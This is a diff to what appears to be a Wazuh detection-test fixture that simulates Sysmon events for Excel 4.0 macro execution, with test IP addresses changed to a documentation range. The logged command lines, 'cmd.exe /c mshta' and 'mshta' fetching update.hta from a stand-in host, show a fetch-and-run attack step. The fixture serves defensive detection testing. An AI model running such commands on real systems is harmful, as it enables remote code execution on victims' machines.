@@ -5,7 +5,6 @@
     "name": "Excel 4.0 Macro (XLM) Execution",
     "description": "Legacy Excel 4.0 macro executing shell command - harder to detect than VBA",
     "expected_detection": "CRITICAL",
-    "expected_soar": "lolbins-abuse-detection",
     "kill_chain_phase": "initial-access",
     "format": "wazuh-native",
     "format_version": "1.0"
@@ -16,7 +15,6 @@
       "sequence": 1,
       "timestamp": "2026-01-29T09:15:00.000Z",
       "log": {
-        "timestamp": "",
         "rule": {
           "level": 12,
           "description": "Sysmon - Event 1: Excel 4.0 Macro (XLM) Execution",
@@ -41,9 +39,9 @@
           ]
         },
         "agent": {
-          "id": "007",
+          "id": "020",
           "name": "WS01",
-          "ip": "10.1.0.20"
+          "ip": "198.51.100.20"
         },
         "manager": {
           "name": "wazuh.manager"
@@ -71,7 +69,7 @@
               "processGuid": "{A1B2C3D4-0002-0002-0002-000000000001}",
               "processId": "6789",
               "image": "C:\\Windows\\System32\\cmd.exe",
-              "commandLine": "cmd.exe /c mshta http://192.168.50.100/update.hta",
+              "commandLine": "cmd.exe /c mshta http://198.51.100.100/update.hta",
               "currentDirectory": "C:\\Users\\jane.smith\\Documents\\",
               "user": "CORP\\jane.smith",
               "integrityLevel": "Medium",
@@ -89,7 +87,6 @@
       "sequence": 2,
       "timestamp": "2026-01-29T09:15:01.000Z",
       "log": {
-        "timestamp": "",
         "rule": {
           "level": 12,
           "description": "Sysmon - Event 1: Excel 4.0 Macro (XLM) Execution",
@@ -114,9 +111,9 @@
           ]
         },
         "agent": {
-          "id": "007",
+          "id": "020",
           "name": "WS01",
-          "ip": "10.1.0.20"
+          "ip": "198.51.100.20"
         },
         "manager": {
           "name": "wazuh.manager"
@@ -144,14 +141,14 @@
               "processGuid": "{A1B2C3D4-0002-0002-0002-000000000002}",
               "processId": "7890",
               "image": "C:\\Windows\\System32\\mshta.exe",
-              "commandLine": "mshta http://192.168.50.100/update.hta",
+              "commandLine": "mshta http://198.51.100.100/update.hta",
               "currentDirectory": "C:\\Users\\jane.smith\\Documents\\",
               "user": "CORP\\jane.smith",
               "integrityLevel": "Medium",
               "parentProcessGuid": "{A1B2C3D4-0002-0002-0002-000000000001}",
               "parentProcessId": "6789",
               "parentImage": "C:\\Windows\\System32\\cmd.exe",
-              "parentCommandLine": "cmd.exe /c mshta http://192.168.50.100/update.hta"
+              "parentCommandLine": "cmd.exe /c mshta http://198.51.100.100/update.hta"
             }
           }
         }
